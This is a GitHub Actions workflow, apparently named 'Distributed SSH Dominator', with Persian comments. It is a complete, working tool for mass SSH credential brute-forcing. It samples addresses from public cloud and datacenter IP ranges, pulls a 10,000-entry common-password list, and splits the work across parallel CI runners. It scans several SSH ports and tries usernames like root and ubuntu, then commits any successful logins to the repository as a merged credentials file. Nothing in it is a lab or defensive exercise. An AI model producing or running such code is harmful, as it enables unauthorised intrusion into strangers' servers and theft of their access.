name: Distributed SSH Dominator

on:
  workflow_dispatch:
    inputs:
      shard_count:
        description: 'تعداد رانرهای هم‌زمان (مثلاً ۱۰)'
        required: true
        default: '10'
      max_ips:
        description: 'حداکثر آیپی برای اسکن (پیش‌فرض ۳۰۰۰۰)'
        required: false
        default: '30000'
      test_threads:
        description: 'نخ‌های هم‌زمان تست (پیش‌فرض ۵۰۰)'
        required: false
        default: '500'
      timeout:
        description: 'زمان انتظار اتصال (ثانیه)'
        required: true
        default: '2'

permissions:
  contents: write

jobs:
  # ===== مرحله ۱: آماده‌سازی و تولید لیست شماره شاردها =====
  prepare:
    runs-on: ubuntu-latest
    outputs:
      shard_indices: ${{ steps.set_output.outputs.indices }}
    steps:
      - uses: actions/checkout@v4
      
      - name: نصب کتابخونه‌ها
        run: pip3 install rich requests

      - name: آماده‌سازی task_list.json و خروجی شاردها
        id: set_output
        env:
          SHARD_COUNT: ${{ github.event.inputs.shard_count }}
          MAX_IPS: ${{ github.event.inputs.max_ips }}
        run: |
          python3 -c "
          import os, json, random, ipaddress, requests

          SHARD_COUNT = int(os.environ['SHARD_COUNT'])
          MAX_IPS = int(os.environ['MAX_IPS'])

          print(f'🔄 آماده‌سازی {SHARD_COUNT} شارد...')

          # دریافت آی‌پی‌های دیتاسنتر
          datacenter_urls = []
          try:
              resp = requests.get('https://raw.githubusercontent.com/jhassine/server-ip-addresses/master/data/datacenters.txt', timeout=30)
              for line in resp.text.splitlines():
                  line = line.strip()
                  if line and not line.startswith('#'):
                      datacenter_urls.append(line)
          except: pass

          provider_map = {'aws':'aws','azure':'azure','gcp':'googlecloud','digitalocean':'digitalocean','linode':'linode','vultr':'vultr','cloudflare':'cloudflare'}
          base_url = 'https://raw.githubusercontent.com/rezmoss/cloud-provider-ip-addresses/master/data'
          for prov in provider_map.values():
              try:
                  resp = requests.get(f'{base_url}/{prov}-ip-ranges.json', timeout=30)
                  data = resp.json()
                  for item in data.get('prefixes',[]):
                      if 'ipv4Prefix' in item:
                          datacenter_urls.append(item['ipv4Prefix'])
              except: pass

          all_ips = set()
          random.shuffle(datacenter_urls)
          for cidr in datacenter_urls[:3000]:
              try:
                  network = ipaddress.IPv4Network(cidr, strict=False)
                  hosts = list(network.hosts())
                  sample_size = min(20, len(hosts))
                  for ip in random.sample(hosts, sample_size):
                      all_ips.add(str(ip))
              except: pass

          ips = list(all_ips)[:MAX_IPS]
          print(f'✅ {len(ips)} آیپی جمع‌آوری شد')

          # دریافت پسوردها از SecLists
          passwords = ['password', '123456', 'admin', 'root']
          try:
              resp = requests.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt', timeout=60)
              passwords = list(set([line.strip() for line in resp.text.splitlines() if line.strip()]))
              print(f'✅ {len(passwords)} پسورد از SecLists')
          except:
              print('⚠️ SecLists در دسترس نیست')

          # تقسیم آی‌پی‌ها و پسوردها بین شاردها
          ip_chunk = len(ips) // SHARD_COUNT
          pwd_chunk = len(passwords) // SHARD_COUNT
          tasks = []
          for i in range(SHARD_COUNT):
              start_ip = i * ip_chunk
              end_ip = start_ip + ip_chunk if i != SHARD_COUNT - 1 else len(ips)
              start_pwd = i * pwd_chunk
              end_pwd = start_pwd + pwd_chunk if i != SHARD_COUNT - 1 else len(passwords)
              tasks.append({
                  'shard': i,
                  'ips': ips[start_ip:end_ip],
                  'passwords': passwords[start_pwd:end_pwd]
              })

          with open('task_list.json', 'w') as f:
              json.dump(tasks, f, indent=2)
          print(f'✅ {len(tasks)} شارد در task_list.json ذخیره شد')
          
          # خروجی شماره شاردها
          with open('indices.json', 'w') as f:
              json.dump(list(range(SHARD_COUNT)), f)
          "
          
          echo "indices=$(cat indices.json)" >> $GITHUB_OUTPUT

      - name: آپلود task_list.json
        uses: actions/upload-artifact@v4
        with:
          name: task-list
          path: task_list.json

  # ===== مرحله ۲: اسکن موازی =====
  scan_shard:
    name: "Shard ${{ matrix.shard }}"
    needs: prepare
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        shard: ${{ fromJson(needs.prepare.outputs.shard_indices) }}
    steps:
      - uses: actions/checkout@v4
      
      - name: دانلود task_list.json
        uses: actions/download-artifact@v4
        with:
          name: task-list

      - name: نصب کتابخونه‌ها
        run: pip3 install rich asyncssh uvloop aiohttp

      - name: اجرای اسکن شارد
        env:
          SHARD_ID: ${{ matrix.shard }}
          TEST_THREADS: ${{ github.event.inputs.test_threads }}
          TIMEOUT: ${{ github.event.inputs.timeout }}
        run: |
          python3 -c "
          import os, sys, json, asyncio, random, socket, time, concurrent.futures
          from pathlib import Path
          import asyncssh

          try:
              import uvloop
              asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
          except: pass

          SHARD_ID = int(os.environ['SHARD_ID'])
          TEST_THREADS = int(os.environ.get('TEST_THREADS', 500))
          TIMEOUT = int(os.environ.get('TIMEOUT', 2))
          SSH_PORTS = [22, 2222, 22222, 2200]
          CRED_FILE = f'found_creds_shard_{SHARD_ID}.txt'

          with open('task_list.json') as f:
              tasks = json.load(f)
          my_task = tasks[SHARD_ID]
          ips = my_task['ips']
          passwords = my_task['passwords']

          print(f'🔥 شارد {SHARD_ID}: {len(ips)} آیپی | {len(passwords)} پسورد')

          # اسکن پورت
          ssh_targets = []
          def check_ssh(ip, port):
              try:
                  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                  sock.settimeout(0.3)
                  result = sock.connect_ex((ip, port))
                  sock.close()
                  return (ip, port) if result == 0 else None
              except: return None

          with concurrent.futures.ThreadPoolExecutor(max_workers=300) as executor:
              futures = []
              for ip in ips:
                  for port in SSH_PORTS:
                      futures.append(executor.submit(check_ssh, ip, port))
              for future in concurrent.futures.as_completed(futures):
                  res = future.result()
                  if res:
                      ssh_targets.append(res)

          print(f'✅ {len(ssh_targets)} سرور SSH پیدا شد')

          if not ssh_targets:
              print('بدون هدف، پایان')
              sys.exit(0)

          # تست اعتبارنامه
          usernames = ['root', 'admin', 'ubuntu', 'ec2-user', 'azureuser', 'centos', 'debian', 'vagrant', 'pi']
          cache_file = Path('cache') / f'dominator_cache_shard_{SHARD_ID}.json'
          cache_file.parent.mkdir(exist_ok=True)
          cache = json.load(open(cache_file)) if cache_file.exists() else {}
          successes = []

          async def test_ssh(ip, port, user, pwd):
              cache_key = f'{ip}:{port}:{user}:{pwd}'
              if cache_key in cache:
                  return (ip, port, user, pwd, cache[cache_key])
              try:
                  async with asyncssh.connect(ip, port=port, username=user, password=pwd,
                                              login_timeout=TIMEOUT, known_hosts=None) as conn:
                      await conn.close()
                  cache[cache_key] = 'SUCCESS'
                  return (ip, port, user, pwd, 'SUCCESS')
              except:
                  cache[cache_key] = 'FAILED'
                  return (ip, port, user, pwd, 'FAILED')

          async def attack_host(ip, port):
              local = []
              failed_pwds = set()
              sem = asyncio.Semaphore(TEST_THREADS)
              async def worker(user, pwd):
                  if pwd in failed_pwds: return
                  async with sem:
                      res = await test_ssh(ip, port, user, pwd)
                      if res[5] == 'SUCCESS':
                          local.append(res)
                          print(f'✅ {ip}:{port} {user}:{pwd}')
                      else:
                          failed_pwds.add(pwd)
              tasks = [worker(u, p) for u in usernames for p in passwords]
              await asyncio.gather(*tasks)
              return local

          async def main():
              tasks = [attack_host(ip, port) for ip, port in ssh_targets]
              results = await asyncio.gather(*tasks)
              for r in results:
                  successes.extend(r)

          asyncio.run(main())

          # ذخیره نتایج
          with open(CRED_FILE, 'w') as f:
              for ip, port, user, pwd, _ in successes:
                  f.write(f'{ip}:{port}:{user}:{pwd}\n')
          with open(cache_file, 'w') as f:
              json.dump(cache, f)

          os.system(f'git add {CRED_FILE} {cache_file} && git commit -m \"Shard {SHARD_ID} results\" && git push 2>/dev/null || true')
          print(f'📄 شارد {SHARD_ID} تموم شد. {len(successes)} اعتبارنامه پیدا شد')
          "

  # ===== مرحله ۳: ادغام نتایج =====
  merge:
    needs: scan_shard
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: ادغام نتایج
        run: |
          git pull origin main 2>/dev/null || true
          echo "📊 ادغام نتایج همه شاردها..."
          cat found_creds_shard_*.txt > final_creds.txt 2>/dev/null || echo "هنوز نتیجه‌ای ذخیره نشده"
          if [ -s final_creds.txt ]; then
            echo "✅ نتایج نهایی:"
            cat final_creds.txt
            git add final_creds.txt
            git commit -m "Merge all shard results" || true
            git push || true
          else
            echo "❌ هیچ اعتبارنامه‌ای پیدا نشد"
          fi
